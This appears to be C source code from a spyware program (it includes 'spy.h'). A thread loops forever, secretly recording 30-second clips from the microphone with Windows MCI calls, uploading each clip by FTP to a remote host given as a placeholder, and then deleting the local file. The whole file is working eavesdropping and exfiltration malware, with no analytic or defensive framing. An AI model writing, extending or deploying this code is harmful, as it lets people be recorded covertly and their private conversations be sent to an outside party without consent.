#include "spy.h"

DWORD WINAPI voiceThread(LPVOID parameter) {
    for (;;) {
        if (FileExists("tempfile.wav")) {
            Send2Ftp("tempfile.wav", "ip", 14148);
            remove("tempfile.wav");
            Sleep(1000);
        }
        else {
            recordWAVEFile(30000);
            Sleep(1000);
        }
    }

    return 0;
}

DWORD recordWAVEFile(DWORD dwMilliSeconds)
{
    UINT wDeviceID;
    DWORD dwReturn;
    MCI_OPEN_PARMS mciOpenParms;
    MCI_RECORD_PARMS mciRecordParms;
    MCI_SAVE_PARMS mciSaveParms;
    MCI_PLAY_PARMS mciPlayParms;

    mciOpenParms.lpstrDeviceType = L"waveaudio";
    mciOpenParms.lpstrElementName = L"";
    if (dwReturn = mciSendCommand(0, MCI_OPEN,
        MCI_OPEN_ELEMENT | MCI_OPEN_TYPE,
        (DWORD)(LPVOID)&mciOpenParms))
    {
        return (dwReturn);
    }

    wDeviceID = mciOpenParms.wDeviceID;

    mciRecordParms.dwTo = dwMilliSeconds;
    if (dwReturn = mciSendCommand(wDeviceID, MCI_RECORD,
        MCI_TO | MCI_WAIT, (DWORD)(LPVOID)&mciRecordParms))
    {
        mciSendCommand(wDeviceID, MCI_CLOSE, 0, NULL);
        return (dwReturn);
    }

    mciPlayParms.dwFrom = 0L;
    if (dwReturn = mciSendCommand(wDeviceID, MCI_PLAY,
        MCI_FROM | MCI_WAIT, (DWORD)(LPVOID)&mciPlayParms))
    {
        mciSendCommand(wDeviceID, MCI_CLOSE, 0, NULL);
        return (dwReturn);
    }

    mciSaveParms.lpfilename = L"tempfile.wav";
    if (dwReturn = mciSendCommand(wDeviceID, MCI_SAVE,
        MCI_SAVE_FILE | MCI_WAIT, (DWORD)(LPVOID)&mciSaveParms))
    {
        mciSendCommand(wDeviceID, MCI_CLOSE, 0, NULL);
        return (dwReturn);
    }

    return (0L);
}